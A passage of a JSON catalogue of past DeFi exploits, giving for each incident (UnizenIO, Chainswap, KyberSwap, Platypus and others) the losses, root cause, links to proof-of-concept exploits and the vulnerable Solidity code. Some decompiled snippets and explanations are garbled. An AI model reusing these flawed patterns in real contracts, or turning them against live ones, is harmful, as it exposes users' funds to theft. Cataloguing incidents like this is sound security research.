Level-Based Rewards in claimTeamReward function\nfunction claimTeamReward(address account) external {\n    uint256 level = getUserLevel(account);\n    uint256 pendingReward;\n    LevelConfig storage levelConfig;\n    \n    if (level != MAX) {\n        for (uint256 i; i <= level;) {\n            levelConfig = _levelConfigs[i];\n            if (_userInfos[account].levelClaimed[i] == 0) {\n                uint256 levelReward;\n                if (i == 0) {\n                    levelReward = levelConfig.teamAmount * levelConfig.rewardRate / _feeDivFactor; // Risk: High rates could lead to excessive rewards\n                } else {\n                    levelReward = (levelConfig.teamAmount - _levelConfigs[i - 1].teamAmount) * levelConfig.rewardRate / _feeDivFactor;\n                }\n                pendingReward += levelReward;\n                _userInfos[account].levelClaimed[i] = levelReward; // Store claimed reward\n            }\n            // ... (other code)\n        }\n    }\n    if (pendingReward > 0) {\n        IERC20(_tokenAddress).transfer(account, pendingReward); // Risk: Could result in payouts exceeding original investment\n    }\n}"

    },
    {
        "type": "Arbitrary call",
        "date": "20240309",
        "lost": "2M",
        "POC": [
            "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO_exp.sol",
            "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO2_exp.sol"
        ],
        "title": "UnizenIO",
        "root_cause": "Beacuse of the Arbitrary call, the attacker were able to access and drain value from the accounts of users who had created approvals for the contract.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x923d1d63a1165ebd3521516f6d22d015f2e1b4b22d5dc954152b6c089c765fcd",
        "analysis": "https://twitter.com/SlowMist_Team/status/1766311510362734824"
    },
    {
        "type": "Bridge, CrossChain, Incorrect logic",
        "date": "20210702",
        "lost": "$0.8 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210702-chainswap---bridge-logic-flaw",
        "title": "Chainswap",
        "fixed": true,
        "root_cause": "insufficient validation. Attacker only needs to generate a random address and generate the corresponding signature to trick ChainSwap.",
        "vulnerable_code_snippet": "function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {\n        _chargeFee();\n        require(received[fromChainId][to][nonce] == 0, 'withdrawn already');\n        uint N = signatures.length;\n        require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');\n        for(uint i=0; i<N; i++) {\n            for(uint j=0; j<i; j++)\n                require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');\n            bytes32 structHash = keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));\n            bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", _DOMAIN_SEPARATOR, structHash));\n            address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);\n            require(signatory != address(0), \"invalid signature\");\n            require(signatory == signatures[i].signatory, \"unauthorized\");\n            _decreaseAuthQuota(signatures[i].signatory, volume);\n            emit Authorize(fromChainId, to, nonce, volume, signatory);\n        }\n        received[fromChainId][to][nonce] = volume;\n        _receive(to, volume);\n        emit Receive(fromChainId, to, nonce, volume);\n    }\n\nfunction authQuotaOf(address signatory) virtual public view returns (uint quota) {\n        quota = _authQuotas[signatory]; //vulnerable point, no validation\n        uint ratio  = autoQuotaRatio  != 0 ? autoQuotaRatio  : Factory(factory).getConfig(_autoQuotaRatio_);\n        uint period = autoQuotaPeriod != 0 ? autoQuotaPeriod : Factory(factory).getConfig(_autoQuotaPeriod_);\n        if(ratio == 0 || period == 0 || period == uint(-1))\n            return quota;\n        uint quotaCap = cap().mul(ratio).div(1e18);\n        uint delta = quotaCap.mul(now.sub(lasttimeUpdateQuotaOf[signatory])).div(period);\n        return Math.max(quota, Math.min(quotaCap, quota.add(delta)));\n    }"
    },
    {
        "type": "Access Control, Insufficient validation",
        "date": "20240510",
        "lost": "140K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TSURU_exp.sol",
        "title": "TSURU",
        "root_cause": "Everyone can call this function to get free tokens. No access control",
        "attack_tx": [
            "https://basescan.org/tx/0xe63a8df8759f41937432cd34c590d85af61b3343cf438796c6ed2c8f5b906f62",
            "https://app.blocksec.com/explorer/tx/base/0xe63a8df8759f41937432cd34c590d85af61b3343cf438796c6ed2c8f5b906f62"
        ],
        "analysis": "https://x.com/shoucccc/status/1788941548929110416",
        "vulnerable_code_snippet": "function onERC1155Received( //vulnerable point\n        address,\n        address from,\n        uint256 id,\n        uint256 amount,\n        bytes calldata\n    ) external override nonReentrant returns (bytes4) {\n        require(id == tokenID, \"Token ID does not match\");\n        \n        if (msg.sender == address(erc1155Contract)) {\n            return this.onERC1155Received.selector;\n        }\n\n        _safeMint(from, amount * ERC1155_RATIO); // Adjust minting based on the ERC1155_RATIO\n        return this.onERC1155Received.selector;\n    }"
    },
    {
        "type": "Business Logic Flaw, Price Manipulation",
        "date": "20240422",
        "lost": "136k USD",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Z123_exp.sol",
        "title": "Z123",
        "root_cause": "After each swap, it destroys liquidity. Good people, a lot of them have been destroyed. Isn't this more and more replacements? The code is on this line, destroying liquidity and raising prices. // First, tokens are exchanged from a pool with normal ratios using USD. // Then, each subsequent swap burns liquidity from the pool, resulting in disproportionate token ratios that can be exploited for arbitrage.",
        "attack_tx": [
            "https://bscscan.com/tx/0xc0c4e99a76da80a4cf43d3110364840151226c0a197c1728bb60dc3f1b3a6a27",
            "https://app.blocksec.com/explorer/tx/bsc/0xc0c4e99a76da80a4cf43d3110364840151226c0a197c1728bb60dc3f1b3a6a27"
        ],
        "analysis": "https://hackfor.fun/z123-exploit-analysis-015b80672cde41f4bcfe53a618295b91",
        "vulnerable_code_snippet": "function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address;\n    v20 = 0;\n    while (v20 < 0) {\n        MEM[v20 + v19.data] = MEM[v20 + (32 + MEM[64])];\n        v20 += 32;\n    }\n    v21 = v19.data;\n    if (0) {\n        MEM[v19.data] = ~0x0 & MEM[v19.data];\n    }\n    require(bool(_swapExactTokensForTokensSupportingFeeOnTransferTokens.code.size));\n    v22 = _swapExactTokensForTokensSupportingFeeOnTransferTokens.call(uint32(0xb6b4c488), v14, v14, to, v12, v19).gas(msg.gas);\n    require(bool(v22), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n    require(bool((address(v0[0x1])).code.size));\n    v23, /* uint256 */ v24 = address(v0[0x1]).balanceOf(to).gas(msg.gas);\n    require(bool(v23), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n    v25 = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000fff6cae900000000000000000000000000000000000000000000000000000000;\n    require(RETURNDATASIZE() >= 32);\n    if (v18 <= v25.length) {\n        if (v25.length - v18 >= amountOutMin) {\n            if (deadline >= block.timestamp) {\n                MEM[4 + MEM[64]] = _swapExactTokensForTokensSupportingFeeOnTransferTokens;\n                require(bool(_setToken.code.size));\n                v26 = _setToken.update(_swapExactTokensForTokensSupportingFeeOnTransferTokens, v3).gas(msg.gas);\n                require(bool(v26), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n                require(bool(_swapExactTokensForTokensSupportingFeeOnTransferTokens.code.size));\n                v27 = _swapExactTokensForTokensSupportingFeeOnTransferTokens.sync().gas(msg.gas);\n                require(bool(v27), 0, RETURNDATASIZE()); // checks call status, propagates error data on error\n                stor_1_0_0 = 1;\n                exit;\n            } else {\n                MEM[MEM[64] + 4] = 32;\n                revert(Error('QiaoswapV2Router: EXPIRED'));\n            }\n        } else {\n            MEM[4 + MEM[64]] = 32;\n            revert(Error('QiaoswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT', v28, v28, 0));\n        }\n    } else {\n        MEM[MEM[64] + 4] = 32;\n        v29 = new bytes[](v25.length);\n        if (v25.length) {\n            v30 = v25.data;\n            v31 = v29.data;\n            v29[0] = v25[0];\n            v32 = v33 = 32;\n            while (v32 < v25.length) {\n                v29[v32] = v25[v32];\n                v32 += 32;\n            }\n        }\n        if (30) {\n            MEM[v29.data] = ~0xffff & MEM[v29.data];\n        }\n        revert(Error(v29, v28, v28, 0));\n    }\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20231028",
        "title": "AstridProtocol",
        "root_cause": "The exploit is due to a vulnerability in the `withdraw`function which doesn't have enough check on the input token address and input amount.\nAs a result, attackers can manipulate the arguments for the withdraw function with counterfeit tokens.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Astrid_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1718454835966775325",
        "lost": "$127ETH",
        "vulnerable_code_snippet": "function withdraw(address _restakedTokenAddress, uint256 amount) public nonReentrant whenNotPaused {\n        require(Utils.contractExists(_restakedTokenAddress), \"AstridProtocol: Contract does not exist\");\n        require(amount > 0, \"AstridProtocol: Amount must be greater than 0\");\n        require(IERC20(_restakedTokenAddress).balanceOf(msg.sender) >= amount, \"AstridProtocol: Insufficient balance of restaked token\");\n        require(IERC20(_restakedTokenAddress).allowance(msg.sender, address(this)) >= amount, \"AstridProtocol: Insufficient allowance of restaked token\");\n\n        uint256 sharesBefore = IRestakedETH(_restakedTokenAddress).scaledBalanceOf(address(this));\n\n        // receive restaked token from user to \"lock\" it\n        bool amountSent = Utils.payMe(msg.sender, amount, _restakedTokenAddress);\n        require(amountSent, \"AstridProtocol: Failed to send restaked token\");\n\n        uint256 sharesAfter = IRestakedETH(_restakedTokenAddress).scaledBalanceOf(address(this));\n        uint256 shares = sharesAfter.sub(sharesBefore); // we store shares of restakedETH to ensure that it is still subject to rebase when locked\n\n        WithdrawalRequest memory request = WithdrawalRequest({\n            withdrawer: msg.sender,\n            restakedTokenAddress: _restakedTokenAddress,\n            amount: amount,\n            requestedRestakedTokenShares: shares,\n            claimableStakedTokenAmount: 0, // placeholder\n            status: WithdrawalStatus.REQUESTED,\n            withdrawalStartBlock: uint32(block.number),\n            withdrawRequestedAt: block.timestamp,\n            withdrawProcessedAt: 0,\n            withdrawClaimedAt: 0,\n            withdrawalRequestsIndex: withdrawalRequests.length,\n            withdrawalRequestsByUserIndex: withdrawalRequestsByUser[msg.sender].length\n        });\n\n        totalWithdrawalRequests[_restakedTokenAddress] += shares;\n        withdrawalRequests.push(request);\n        withdrawalRequestsByUser[msg.sender].push(request);\n\n        emit WithdrawalRequested(msg.sender, _restakedTokenAddress, amount, shares);\n\n        if (processWithdrawalsOnWithdraw) {\n            _processWithdrawals();\n        }\n    }\n\nfunction _processWithdrawals() internal whenNotPaused {\n        uint256 _withdrawalRequestsLength = withdrawalRequests.length;\n        while(withdrawalProcessingCurrentIndex < _withdrawalRequestsLength) {\n            WithdrawalRequest memory request = withdrawalRequests[withdrawalProcessingCurrentIndex];\n            require(request.status == WithdrawalStatus.REQUESTED, \"AstridProtocol: Withdrawal status mismatch\");\n\n            address _restakedTokenAddress = request.restakedTokenAddress;\n            address _stakedTokenAddress = IRestakedETH(_restakedTokenAddress).stakedTokenAddress();\n            uint256 requestedAmount = IRestakedETH(_restakedTokenAddress).scaledBalanceToBalance(request.requestedRestakedTokenShares);\n            if (requestedAmount > IERC20(_stakedTokenAddress).balanceOf(address(this)) - totalClaimableWithdrawals[_stakedTokenAddress]) {\n                break;\n            }\n\n            totalWithdrawalRequests[_restakedTokenAddress] -= request.requestedRestakedTokenShares;\n            IRestakedETH(_restakedTokenAddress).burn(address(this), requestedAmount);\n            totalClaimableWithdrawals[_stakedTokenAddress] += requestedAmount;\n\n            withdrawalRequests[withdrawalProcessingCurrentIndex].claimableStakedTokenAmount = requestedAmount;\n            withdrawalRequests[withdrawalProcessingCurrentIndex].status = WithdrawalStatus.PROCESSED;\n            withdrawalRequests[withdrawalProcessingCurrentIndex].withdrawProcessedAt = block.timestamp;\n\n            uint256 withdrawerIndex = request.withdrawalRequestsByUserIndex;\n            withdrawalRequestsByUser[request.withdrawer][withdrawerIndex].claimableStakedTokenAmount = requestedAmount;\n            withdrawalRequestsByUser[request.withdrawer][withdrawerIndex].status = WithdrawalStatus.PROCESSED;\n            withdrawalRequestsByUser[request.withdrawer][withdrawerIndex].withdrawProcessedAt = block.timestamp;\n\n            emit WithdrawalProcessed(withdrawalProcessingCurrentIndex);\n\n            withdrawalProcessingCurrentIndex += 1;\n        }\n    }"
    },
    {
        "type": "Bridge, CrossChain, Insufficient validation",
        "date": "20220118",
        "title": "Multichain (Anyswap)",
        "root_cause": "insufficient validation. Use costom contract to trick contract of Multichain V4Router. without any allowed v, r and s.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220118-multichain-anyswap---insufficient-token-validation",
        "analysis": "Use costom contract to trick contract of Multichain V4Router. without any allowed v, r and s.",
        "vulnerable_code_snippet": "function anySwapOutUnderlyingWithPermit(\n        address from,\n        address token, // without validation\n        address to,\n        uint amount,\n        uint deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        uint toChainID\n    ) external {\n        address _underlying = AnyswapV1ERC20(token).underlying();\n        IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s); //vulnerable point\n        TransferHelper.safeTransferFrom(_underlying, from, token, amount);\n        AnyswapV1ERC20(token).depositVault(amount, from);\n        _anySwapOut(from, token, to, amount, toChainID);\n    }"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230704",
        "lost": "200BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Bamboo_exp.sol",
        "title": "BambooIA",
        "root_cause": "When the private updatePool function is invoked in the _transfer function, the resulting token transfer will burn the balance of the $BAMBOO token in the pair, causing a rise in the token price.",
        "vulnerable_code": "```jsx\nfunction updatePool(uint256 amount) private {\n        if (amount > 10000 && balanceOf(uniswapPair) > amount) {\n            uint256 fA = amount / 100;\n            _balances[uniswapPair] = _balances[uniswapPair].sub(fA);\n            _balances[Factory] = _balances[Factory].add(fA);\n            try IUniswapV2Pair(uniswapPair).sync() {} catch {} \n        }\n    }\n```",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x88a6c2c3ce86d4e0b1356861b749175884293f4302dbfdbfb16a5e373ab58a10",
        "analysis": "Post-mortem : [https://twitter.com/Phalcon_xyz/status/1676220090142916611]",
        "vulnerable_code_snippet": "if (!isMarketPair[sender] && sale > 0) updatePool(amount); ... function updatePool(uint256 amount) private {\n        if (amount > 10000 && balanceOf(uniswapPair) > amount) {\n            uint256 fA = amount / 100;\n            _balances[uniswapPair] = _balances[uniswapPair].sub(fA);\n            _balances[Factory] = _balances[Factory].add(fA);\n            try IUniswapV2Pair(uniswapPair).sync() {} catch {}\n        }\n    }"
    },
    {
        "type": "Inflation Attack",
        "date": "20231230",
        "title": "ChannelsFinance",
        "root_cause": "ExchangeRate manipulation. The root cause is the ExchangeRate manipulation. Once the exchangeRate been controlled, hacker could borrow more than their collateral. The contract uses a old Compund V2 protocols which has a known vulenrability.",
        "attack_tx": [
            "https://app.blocksec.com/explorer/tx/bsc/0x711cc4ceb9701d317fe9aa47187425e16dae7d5a0113f1430e891018262f8fb5",
            "https://app.blocksec.com/explorer/tx/bsc/0x93372ce9c86a25f1477b0c3068e745b5b829d5b58025bb1ab234230d3473b776"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/ChannelsFinance_exp.sol",
        "analysis": [
            "https://x.com/AnciliaInc/status/1741353303542501455",
            "https://www.comp.xyz/t/hundred-finance-exploit-and-compound-v2/4266"
        ],
        "lost": "$320K",
        "vulnerable_code_snippet": "function exchangeRateStoredInternal() internal view returns (MathError, uint) {\n    uint _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        /* \n         * If there are no tokens minted:\n         * exchangeRate = initialExchangeRate\n         */\n        return (MathError.NO_ERROR, initialExchangeRateMantissa);\n    } else {\n        /* \n         * Otherwise:\n         * exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n         */\n        uint totalCash = getCashPrior();\n        uint cashPlusBorrowsMinusReserves;\n        Exp memory exchangeRate;\n        MathError mathErr;\n\n        (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(totalCash, totalBorrows, totalReserves);\n        if (mathErr != MathError.NO_ERROR) {\n            return (mathErr, 0);\n        }\n\n        (mathErr, exchangeRate) = getExp(cashPlusBorrowsMinusReserves, _totalSupply);\n        if (mathErr != MathError.NO_ERROR) {\n            return (mathErr, 0);\n        }\n\n        return (MathError.NO_ERROR, exchangeRate.mantissa);\n    }\n}"
    },
    {
        "type": "Under/Overflow",
        "date": "20240208",
        "title": "Pandora",
        "root_cause": "By overflowing the users balance, the attacker was able to maliciously gain a large amount of pandora tokens",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/PANDORA_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0x7c5a909b45014e35ddb89697f6be38d08eff30e7c3d3d553033a6efc3b444fdd",
        "Lost": "17K USD",
        "analysis": null,
        "vulnerable_code_snippet": "function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal returns (bool) {\n        uint256 unit = _getUnit();\n        uint256 balanceBeforeSender = balanceOf[from];\n        uint256 balanceBeforeReceiver = balanceOf[to];\n\n        _preTransferCheck(from, to);\n\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n\n        // Skip burn for certain addresses to save gas\n        if (!whitelist[from]) {\n            uint256 tokens_to_burn = (balanceBeforeSender / unit) -\n                (balanceOf[from] / unit);\n            for (uint256 i = 0; i < tokens_to_burn; i++) {\n                _burn(from);\n            }\n        }\n\n        // Skip minting for certain addresses to save gas\n        if (!whitelist[to]) {\n            uint256 tokens_to_mint = (balanceOf[to] / unit) -\n                (balanceBeforeReceiver / unit);\n            for (uint256 i = 0; i < tokens_to_mint; i++) {\n                _mint(to);\n            }\n        }\n\n        emit ERC20Transfer(from, to, amount);\n        return true;\n    }"
    },
    {
        "type": "Insufficient validation",
        "date": "20240215",
        "lost": "150k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Miner_exp.sol",
        "title": "Miner",
        "root_cause": "The attack exploited a double spend vulnerability due to inadequate validation. Specifically, the system did not verify that the sender's address was different from the recipient's, enabling the attacker to repay the loan and send tokens to themselves.",
        "attack_tx": "https://etherscan.io/tx/0x75e3aeb00df69882a1b15d424e5e642650326ca3b923d7fd1922d57c51bc2c78",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1757777340002681326",
        "vulnerable_code_snippet": "function _transfer(address from, address to, uint256 value, bool mint) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value, mint);\n    }"
    },
    {
        "type": "Bridge, Signature",
        "date": "20220608",
        "lost": "$3M OP",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220608-optimism---wintermute---signature-replay",
        "title": "Wintermute",
        "fixed": "fixed",
        "root_cause": "contract does not use eip155 to prevent replay attacks. To create a contract address on Optimism that is the same as the one on Ethereum, we just need to make sure that the two parameters, sender’s address and the nonce, are the same as the ones used in generating the valid address on Ethereum.",
        "analysis": "To create a contract address on Optimism that is the same as the one on Ethereum, we just need to make sure that the two parameters, sender's address and the nonce, are the same as the ones used in generating the valid address on Ethereum.\n\n```solidity\n/// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.\n    /// @param masterCopy Address of master copy.\n    /// @param data Payload for message call sent to new proxy contract.\nfunction createProxy(address masterCopy, bytes memory data)\n        public\n        returns (Proxy proxy)\n    {\n        proxy = new Proxy(masterCopy);\n        if (data.length > 0)\n            // solium-disable-next-line security/no-inline-assembly\n            assembly {\n                if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }\n            }\n        emit ProxyCreation(proxy);\n    }\n```",
        "vulnerable_code_snippet": "/// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.\n    /// @param masterCopy Address of master copy.\n    /// @param data Payload for message call sent to new proxy contract.\n    function createProxy(address masterCopy, bytes memory data)\n        public\n        returns (Proxy proxy)\n    {\n        proxy = new Proxy(masterCopy);\n        if (data.length > 0)\n            // solium-disable-next-line security/no-inline-assembly\n            assembly {\n                if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }\n            }\n        emit ProxyCreation(proxy);\n    }"
    },
    {
        "type": "Precision, Price Manipulation",
        "date": "20231122",
        "title": "KyberSwap",
        "root_cause": "In the first swap, when calculating Ticks, there is ***incorrect rounding direction during the reinvestment process***. Thus the tick could be manipulated, and `_updateLiquidityAndCrossTick` 0could be bypassed.In the second swap, the `_updateLiquidityAndCrossTick` is being triggered to increase liquidity. However, since there is precision loss in the first swap, the liquidity is then double counted.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/KyberSwap_exp.eth.1.sol",
        "analysis": "https://blocksec.com/blog/yet-another-tragedy-of-precision-loss-an-in-depth-analysis-of-the-kyber-swap-incident-1",
        "lost": "$48M",
        "vulnerable_code_snippet": "/// @dev estimates deltaL, the swap fee to be collected based on amount specified\n/// for the final swap step to be performed,\n/// where the next (temporary) tick will not be crossed\n\nfunction estimateIncrementalLiquidity(\n    uint256 absDelta,\n    uint256 liquidity,\n    uint160 currentSqrtP,\n    uint256 feeInFeeUnits,\n    bool isExactInput,\n    bool isToken0\n) internal pure returns (uint256 deltaL) {\n    if (isExactInput) {\n        if (isToken0) {\n            // deltaL = feeInFeeUnits * absDelta * currentSqrtP / 2\n            deltaL = FullMath.mulDivFloor(\n                currentSqrtP,\n                absDelta * feeInFeeUnits,\n                C.TWO_FEE_UNITS << C.RES_96\n            );\n        } else {\n            // deltaL = feeInFeeUnits * absDelta * currentSqrtP * 2\n            // Because nextSqrtP = (liquidity + absDelta / currentSqrtP) * currentSqrtP / (liquidity + deltaL)\n            // so we round down nextSqrtP\n            deltaL = FullMath.mulDivFloor(\n                C.TWO_POW_96,\n                absDelta * feeInFeeUnits,\n                C.TWO_FEE_UNITS * currentSqrtP\n            );\n        }\n    }\n}"
    },
    {
        "type": "Arbitrary call",
        "date": "20231031",
        "title": "UniBotRouter",
        "root_cause": "The function `0xb2bd16ab` in the `UniBot` does not properly check input parameters. Thus anyone can use this function to arbitrarily call the external token contract and execute the transferFrom() method. Thus anyone who approves the `UniBot` contract may suffer from the attack.",
        "attack_tx": "https://etherscan.io/tx/0xcbe521aea28911fe9983030748028e12541e347b8b6b974d026fa5065c22f0cf",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/UniBot_exp.sol",
        "analysis": "https://twitter.com/PeckShieldAlert/status/1719251390319796477",
        "lost": "$83,944 USD",
        "vulnerable_code_snippet": "require(64 + varg0.data + 32 - (64 + varg0.data) >= 32);\nrequire(varga[2] == address(varg0[2]));\nCALLDATACOPY(v39.data, varg4.data, varg0.length);\nMEM[varg4.length + v39.data] = 0;\nv40, /* uint256 */ v41, /* uint256 */ v42 = address(varg0[2]).call(v39.data).value(msg.value).gas(msg.gas);\nif (RETURN_DATA_SIZE() != 0) {\n    v43 = new bytes[](RETURN_DATA_SIZE());\n    RETURN_DATA_COPY(v43.data, 0, RETURN_DATA_SIZE());\n}\nrequire(v40, MEM[64], RETURN_DATA_SIZE());"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20230529",
        "lost": "$600",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/FAPEN_exp.sol",
        "title": "FAPEN",
        "root_cause": "It does not update the timestamp after the registration. In this case, the attacker can invoke the function register for multiple times. The `register()` function rewards the double gems token if you statisfy the `if` condition. The hacker abuse the `register()` function to get extra GEM bonuse.",
        "attack_tx": "https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582",
        "analysis": [
            "https://twitter.com/AnciliaInc/status/1592658104394473472",
            "https://twitter.com/BlockSecTeam/status/1592734292727455744"
        ],
        "vulnerable_code_snippet": "function register(address neighbor) external initialized {\n\taddress user = msg.sender;\n    require(villages[user].timestamp == 0, \"just new users\"); //vulnerable points\n    uint256 gems;\n    totalVillages++;\n    if (villages[neighbor].sheeps[0] > 0 && neighbor != manager) {\n        gems += GEM_BONUS * 2;\n    } else{\n        neighbor = manager;\n        gems += GEM_BONUS;\n    }\n    villages[neighbor].neighbors++;\n    villages[user].neighbor = neighbor;\n    villages[user].gems += gems;\n    emit Newbie(msg.sender, gems);\n}"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20221205",
        "title": "BBOX",
        "root_cause": "FlashLoan price manipulation - `_transfer()` will burn the BBOX token incorrectly.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xac57c78881a7c00dfbac0563e21b5ae3a8e3f9d1b07198a27313722a166cc0a3",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BBOX_exp.sol",
        "vulnerable_code": "https://bscscan.com/address/0x5dfc7f3ebbb9cbfe89bc3fb70f750ee229a59f8c#code#L728",
        "analysis": "https://twitter.com/AnciliaInc/status/1599599614490877952",
        "lost": "$12k",
        "vulnerable_code_snippet": "function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n\n        if( \n            !_isContract(to) \n            && _recommerMapping[to] == address(0) \n            && amount >= recommeCondition){\n            \n            if( ammPairs[from]  ){\n                addRelationEx(holder,to);\n            }else{\n                addRelationEx(from,to);\n            }\n        }\n\n        bool isAddLiquidity;\n        bool isDelLiquidity;\n        ( isAddLiquidity, isDelLiquidity) = _isLiquidity(from,to);\n\n        if( \n            pairAmountChange \n            && !isAddLiquidity\n            && pairAmount > 0 \n            && !ammPairs[from] \n            && pairAmount < balanceOf(uniswapV2Pair)){\n\n            uint v = pairAmount;\n            pairAmount = 0;\n            _tOwned[uniswapV2Pair] =  _tOwned[uniswapV2Pair].sub(v); //vulnerable point\n            _tOwned[address(0)] = _tOwned[address(0)].add(v);\n            emit Transfer(uniswapV2Pair, address(0), v);\n\n            IUniswapV2Pair(uniswapV2Pair).sync();\n        }\n    }"
    },
    {
        "type": "Incorrect logic, Miscalculation, lending",
        "date": "20230217",
        "title": "Platypusdefi",
        "lost": "$8.5M",
        "root_cause": "The emergencyWithdraw function incorrectly evaluates the insolvency before the collateral removal, resulting in an insolvent debt position after the emergency withdrawal.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Platypus_exp.sol",
        "vulnerable_code": "https://snowtrace.io/address/0xc007f27b757a782c833c568f5851ae1dfe0e6ec7#code#F1#L578",
        "attack_tx": "https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430",
        "analysis": [
            "https://twitter.com/spreekaway/status/1626319585040338953",
            "https://twitter.com/peckshield/status/1626367531480125440",
            "https://twitter.com/danielvf/status/1626340324103663617"
        ],
        "vulnerable_code_snippet": "function emergencyWithdraw(uint256 _pid) public nonReentrant {\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n\n        if (address(platypusTreasure) != address(0x00)) {\n            (bool isSolvent, ) = platypusTreasure.isSolvent(msg.sender, address(poolInfo[_pid].lpToken), true); //Vulnerable Point: No Check for Adjustment for borrowed funds\n            require(isSolvent, 'remaining amount exceeds collateral factor');\n        }\n\n        // reset rewarder before we update lpSupply and sumOfFactors\n        IBoostedMultiRewarder rewarder = pool.rewarder;\n        if (address(rewarder) != address(0)) {\n            rewarder.onPtpReward(msg.sender, user.amount, 0, user.factor, 0);\n        }\n\n        // SafeERC20 is not needed as Asset will revert if transfer fails\n        pool.lpToken.transfer(address(msg.sender), user.amount);\n\n        // update non-dialuting factor\n        pool.sumOfFactors -= user.factor;\n\n        user.amount = 0;\n        user.factor = 0;\n        user.rewardDebt = 0;\n\n        emit EmergencyWithdraw(msg.sender, _pid, user.amount);\n    }"
    },
    {
        "type": "Access Control, Lack of permission control",
        "date": "20240412",
        "title": "GROKD",
        "root_cause": "There is access control issue in `0xd2beb00a` function that leads to the exploit.",
        "attack_tx": [
            "https://app.blocksec.com/explorer/tx/bsc/0x383dbb44a91687b2b9bbd8b6779957a198d114f24af662776f384569b84fc549",
            "https://app.blocksec.com/explorer/tx/bsc/0x8293946b5c88c4a21250ca6dc93c6d1a695fb5d067bb2d4aed0a11bd5af1fb32"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/GROKD_exp.sol",
        "analysis": [
            "Root cause:",
            "Vulnerable code snippet:",
            "[ChainDuck on Twitter / X](https://x.com/hipalex921/status/1778482890705416323?t=KvvG83s7SXr9I55aftOc6w&s=05)"
        ],
        "lost": "$150 BNB",
